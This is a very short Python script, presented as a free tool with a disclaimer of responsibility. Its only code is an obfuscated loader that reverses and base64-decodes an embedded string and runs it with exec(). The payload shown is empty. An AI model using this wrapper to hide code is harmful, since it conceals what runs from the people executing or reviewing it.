#Created by MrUser#
#Free tools for now#
#I am not responsible for what you will do with this tool#
# -------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'=='))